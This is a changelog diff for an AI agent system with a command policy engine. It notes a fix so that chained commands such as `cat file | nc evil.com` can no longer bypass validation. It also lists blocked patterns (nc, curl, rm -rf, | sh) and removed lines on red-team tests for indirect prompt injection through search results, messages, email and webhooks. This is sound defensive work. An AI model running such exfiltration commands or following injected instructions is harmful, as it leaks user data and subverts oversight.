-- **RESPONSE tag stripping order-of-operations** — `<RESPONSE>` tags were stripped AFTER `extract_code_blocks()` but the EXECUTION destination fence unwrap then overwrote the clean content with the pre-strip code block. When Qwen outputs `<RESPONSE>code</RESPONSE>` without markdown fences, the B-006 fallback puts the full text (tags included) into a single CodeBlock. The EXECUTION unwrap at line 1236 then replaced the stripped content with the tagged version. Fix: moved `<think>` + `<RESPONSE>` stripping to before code block extraction so all downstream operations work on clean content. Defence-in-depth: added `<RESPONSE>` tag strip in `_file_write()` for code files. Regression test added. Affected ~6-8 G-suite tests (t2_fastapi_app, t2_makefile_c_project, t1_rust_binary_search, s6_debug_buggy, multiple G2 debug scenarios)
 
 ---
 
@@ -329,7 +305,6 @@ For v0.2-v0.3 detail (2026-02-17 to 2026-02-22), see `archive/2026-02-23_changel
 - **Defence-in-depth fence strip at file_write** — `_file_write()` now strips markdown fences from code file types (`.py`, `.rs`, `.js`, etc.) as a second layer. If orchestrator unwrap missed a case (e.g. DISPLAY destination), fences are caught before hitting disk. Non-code files (`.md`, `.txt`, `.json`) are untouched
 - **Word-boundary blocked pattern matching** — single-word blocked patterns (`nc`, `exec`, `eval`, `mount`, `curl`) now use `\b` word-boundary regex instead of substring matching. Prevents false positives like `advanced.py` (nc), `execute` (exec), `evaluate` (eval), `amount` (mount). Multi-word patterns (`rm -rf`, `python3 -c`, `| sh`) keep substring matching
 - **Compound command validation** — `check_command()` now splits on `|`, `&&`, `||`, `;` (outside quotes) and validates each sub-command against the allowed list and path constraints. Previously only the first command was checked, so `cat file | nc evil.com` passed because base=`cat`. 17 new tests
-- **G-suite + red team script hardening** — 9 bugs found and fixed across test harness scripts: `analyse_red_team.py` JSONL format mismatch (rewritten loader + normalisation layer), `run_red_team.sh` set-e/pipefail issues, `red_team_b2.py` missing health check + wrong defaults + no fsync, `functional_test_debug.py` + `functional_test_deps.py` NoneType crash on `{"error": null}`
 - **Build-file `dangerous_rm` exemption** — `CommandPatternScanner` now recognises Makefile content (by language tag or content heuristic) and exempts `rm -f $(VAR)` targeting shell variables in clean targets. Absolute and home-dir paths remain flagged. Follows existing Dockerfile exemption pattern. 10 new tests
 - **G suite runner bash bug** — `run_g_suite_all.sh` died after first suite due to `((PASS++))` evaluating `((0))` → exit code 1 under `set -e`. Fixed arithmetic to `PASS=$((PASS + 1))`
 - **G1 `t1_json_config` verification too strict** — accepted only exact keys `host`/`database`, now accepts any key containing "host"/"port" (e.g. `database_host`, `database_port`)
@@ -351,11 +326,9 @@ For v0.2-v0.3 detail (2026-02-17 to 2026-02-22), see `archive/2026-02-23_changel
 
 ### Added
 - **G7: Daily Smoke test suite** — 5 cross-suite prompts (G1-G5) for fast regression detection. Multi-turn debug support, plan quality gate, response verification. ~10 min runtime. 43 unit tests. All G-phase scripts (G1-G7) now complete
-- **TL4 activation sequence** — 8-step runbook in capability tracker for benchmark → config fix → G-suite → red team → TL4 production. Deployment changelog records run order rationale
 
 ### Security
 - **TL4 benchmark v0.4.1-alpha-tl4 (in progress)** — 932/1136 prompts (82%). 0 confirmed real risks. 1 triage false positive (mocked test string matching `rm -rf /` regex). 5 needs_review all safe on inspection (educational content with refusal). 84% genuine pass rate, 96.4% fixable after PolicyEngine tuning (`cd` allowlist = 12 FPs)
-- **Red team B1/B1.5 indirect injection coverage confirmed** — B1.5 tests injection via search results, Signal messages, email bodies/attachments, webhook payloads. B1 tests context poisoning over 10-15 turn sessions. B2 tests metadata side-channel oracles. Custom benchmark compared favourably against industry standards (AgentHarm, AgentDojo, InjecAgent, ASB)
 
 ---
 
